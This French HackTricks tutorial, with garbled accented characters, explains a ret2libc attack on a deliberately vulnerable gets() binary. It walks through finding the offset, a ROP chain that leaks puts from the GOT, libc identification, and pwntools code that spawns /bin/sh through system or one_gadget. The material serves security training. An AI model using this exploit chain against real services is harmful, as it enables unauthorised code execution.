# Fuite d'adresse libc avec ROP

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

- Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
- D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
- **Rejoignez** le üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
- **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## R√©sum√© rapide

1. **Trouver** le d√©calage de d√©bordement
2. **Trouver** le gadget `POP_RDI`, `PUTS_PLT` et les gadgets `MAIN`
3. Utiliser les gadgets pr√©c√©dents pour **fuir l'adresse m√©moire** de puts ou d'une autre fonction libc et **trouver la version de la libc** ([t√©l√©chargez-la](https://libc.blukat.me))
4. Avec la biblioth√®que, **calculer le ROP et l'exploiter**

## Autres tutoriels et binaires pour s'entra√Æner

Ce tutoriel va exploiter le code/binaire propos√© dans ce tutoriel : [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
Autres tutoriels utiles : [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

## Code

Nom de fichier : `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## Mod√®le de fuite de LIBC ROP

T√©l√©chargez l'exploit et placez-le dans le m√™me r√©pertoire que le binaire vuln√©rable et fournissez les donn√©es n√©cessaires au script:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 1- Recherche du d√©calage

Le mod√®le n√©cessite un d√©calage avant de continuer avec l'exploit. S'il n'est pas fourni, il ex√©cutera le code n√©cessaire pour le trouver (par d√©faut `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**Ex√©cutez** `python template.py` une console GDB s'ouvrira avec le programme plant√©. √Ä l'int√©rieur de cette **console GDB**, ex√©cutez `x/wx $rsp` pour obtenir les **octets** qui allaient √©craser le RIP. Enfin, obtenez le **d√©calage** en utilisant une console **python** :
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../.gitbook/assets/image (1004).png>)

Apr√®s avoir trouv√© le d√©calage (dans ce cas 40), changez la variable OFFSET √† l'int√©rieur du mod√®le en utilisant cette valeur.\
`OFFSET = "A" * 40`

Une autre fa√ßon serait d'utiliser: `pattern create 1000` -- _ex√©cuter jusqu'√† ret_ -- `pattern seach $rsp` de GEF.

## 2- Recherche de Gadgets

Maintenant, nous devons trouver des gadgets ROP √† l'int√©rieur du binaire. Ces gadgets ROP seront utiles pour appeler `puts` afin de trouver la **libc** utilis√©e, et plus tard pour **lancer l'exploit final**.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
Le `PUTS_PLT` est n√©cessaire pour appeler la **fonction puts**.\
Le `MAIN_PLT` est n√©cessaire pour appeler la **fonction principale** √† nouveau apr√®s une interaction pour **exploiter** √† nouveau le d√©bordement (des tours d'exploitation infinis). **Il est utilis√© √† la fin de chaque ROP pour rappeler le programme**.\
Le **POP\_RDI** est n√©cessaire pour **passer** un **param√®tre** √† la fonction appel√©e.

√Ä cette √©tape, vous n'avez pas besoin d'ex√©cuter quoi que ce soit car tout sera trouv√© par pwntools pendant l'ex√©cution.

## 3- Recherche de la biblioth√®que libc

Il est maintenant temps de trouver quelle version de la biblioth√®que **libc** est utilis√©e. Pour ce faire, nous allons **fuir** l'**adresse** en m√©moire de la **fonction** `puts` puis nous allons **rechercher** dans quelle **version de biblioth√®que** la version de puts se trouve √† cette adresse.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
Pour ce faire, la ligne la plus importante du code ex√©cut√© est :
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
Cela enverra quelques octets jusqu'√† ce que **l'√©crasement** du **RIP** soit possible : `OFFSET`.\
Ensuite, il d√©finira l'**adresse** du gadget `POP_RDI` afin que l'adresse suivante (`FUNC_GOT`) soit enregistr√©e dans le registre **RDI**. Cela est n√©cessaire car nous voulons **appeler puts** en lui **passant** l'**adresse** du `PUTS_GOT` car l'adresse en m√©moire de la fonction puts est enregistr√©e √† l'adresse point√©e par `PUTS_GOT`.\
Ensuite, `PUTS_PLT` sera appel√© (avec `PUTS_GOT` dans le **RDI**) afin que puts **lise le contenu** √† l'int√©rieur de `PUTS_GOT` (**l'adresse de la fonction puts en m√©moire**) et l'**affiche**.\
Enfin, la **fonction principale est rappel√©e** pour que nous puissions exploiter √† nouveau le d√©passement de tampon.

De cette mani√®re, nous avons **tromp√© la fonction puts** pour qu'elle **affiche** l'**adresse** en **m√©moire** de la fonction **puts** (qui se trouve dans la biblioth√®que **libc**). Maintenant que nous avons cette adresse, nous pouvons **rechercher quelle version de libc est utilis√©e**.

![](<../../../../.gitbook/assets/image (1046).png>)

Comme nous **exploitons** un **binaire local**, il n'est **pas n√©cessaire** de d√©terminer quelle version de **libc** est utilis√©e (il suffit de trouver la biblioth√®que dans `/lib/x86_64-linux-gnu/libc.so.6`).\
Cependant, dans le cas d'une exploitation √† distance, je vais expliquer ici comment vous pouvez le trouver :

### 3.1- Recherche de la version de libc (1)

Vous pouvez rechercher quelle biblioth√®que est utilis√©e sur la page web : [https://libc.blukat.me/](https://libc.blukat.me)\
Cela vous permettra √©galement de t√©l√©charger la version de **libc** d√©couverte

![](<../../../../.gitbook/assets/image (218).png>)

### 3.2- Recherche de la version de libc (2)

Vous pouvez √©galement faire :

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

Cela prendra du temps, soyez patient.\
Pour que cela fonctionne, nous avons besoin de :

* Nom du symbole libc : `puts`
* Adresse libc divulgu√©e : `0x7ff629878690`

Nous pouvons d√©terminer quelle **libc** est probablement utilis√©e.
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
Nous obtenons 2 correspondances (vous devriez essayer la deuxi√®me si la premi√®re ne fonctionne pas). T√©l√©chargez la premi√®re :
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
Copiez la libc depuis `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` vers notre r√©pertoire de travail.

### 3.3- Autres fonctions pour la fuite
```python
puts
printf
__libc_start_main
read
gets
```
## 4- Recherche de l'adresse de la libc utilis√©e et exploitation

√Ä ce stade, nous devrions conna√Ætre la biblioth√®que libc utilis√©e. Comme nous exploitons un binaire local, je vais utiliser simplement : `/lib/x86_64-linux-gnu/libc.so.6`

Ainsi, au d√©but de `template.py`, changez la variable **libc** en : `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #D√©finir le chemin de la biblioth√®que une fois connu`

En fournissant le **chemin** de la **biblioth√®que libc**, le reste de l'**exploit sera automatiquement calcul√©**.

√Ä l'int√©rieur de la fonction `get_addr`, la **base de l'adresse de la libc** va √™tre calcul√©e :
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
Notez que **l'adresse de base finale de la libc doit se terminer par 00**. Si ce n'est pas votre cas, vous pourriez avoir divulgu√© une biblioth√®que incorrecte.
{% endhint %}

Ensuite, l'adresse de la fonction `system` et l'**adresse** de la cha√Æne _"/bin/sh"_ vont √™tre **calcul√©es** √† partir de l'**adresse de base** de la **libc** et √©tant donn√© la **biblioth√®que libc**.
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
Enfin, l'exploit d'ex√©cution /bin/sh va √™tre pr√©par√© et envoy√© :
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Expliquons ce dernier ROP.\
Le dernier ROP (`rop1`) s'est termin√© en appelant √† nouveau la fonction principale, donc nous pouvons **exploiter √† nouveau** le **d√©bordement** (c'est pourquoi l'`OFFSET` est √† nouveau pr√©sent). Ensuite, nous voulons appeler `POP_RDI` pointant vers l'**adresse** de _"/bin/sh"_ (`BINSH`) et appeler la fonction **system** (`SYSTEM`) car l'adresse de _"/bin/sh"_ sera pass√©e en param√®tre.\
Enfin, l'**adresse de la fonction exit** est **appel√©e** pour que le processus **se termine proprement** et qu'aucune alerte ne soit g√©n√©r√©e.

**Ainsi, l'exploit ex√©cutera un shell \_/bin/sh**\_\*\*.

![](<../../../../.gitbook/assets/image (162).png>)

## 4(2)- Utilisation de ONE\_GADGET

Vous pourriez √©galement utiliser [**ONE\_GADGET**](https://github.com/david942j/one_gadget) pour obtenir un shell au lieu d'utiliser **system** et **"/bin/sh". ONE\_GADGET** trouvera √† l'int√©rieur de la biblioth√®que libc un moyen d'obtenir un shell en utilisant juste une seule **adresse ROP**.\
Cependant, il y a g√©n√©ralement certaines contraintes, les plus courantes et faciles √† √©viter sont comme `[rsp+0x30] == NULL`. Comme vous contr√¥lez les valeurs √† l'int√©rieur du **RSP**, vous n'avez qu'√† envoyer quelques valeurs NULL suppl√©mentaires pour √©viter la contrainte.

![](<../../../../.gitbook/assets/image (751).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## FICHIER D'EXPLOIT

Vous pouvez trouver un mod√®le pour exploiter cette vuln√©rabilit√© ici :

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## Probl√®mes courants

### MAIN\_PLT = elf.symbols\['main'] introuvable

Si le symbole "main" n'existe pas. Vous pouvez alors trouver o√π se trouve le code principal :
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
et d√©finir manuellement l'adresse :
```python
MAIN_PLT = 0x401080
```
### Puts non trouv√©

Si le binaire n'utilise pas Puts, vous devriez v√©rifier s'il utilise

### `sh: 1: %s%s%s%s%s%s%s%s: not found`

Si vous trouvez cette **erreur** apr√®s avoir cr√©√© **toute** l'exploit : `sh: 1: %s%s%s%s%s%s%s%s: not found`

Essayez de **soustraire 64 octets √† l'adresse de "/bin/sh"**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

D'autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
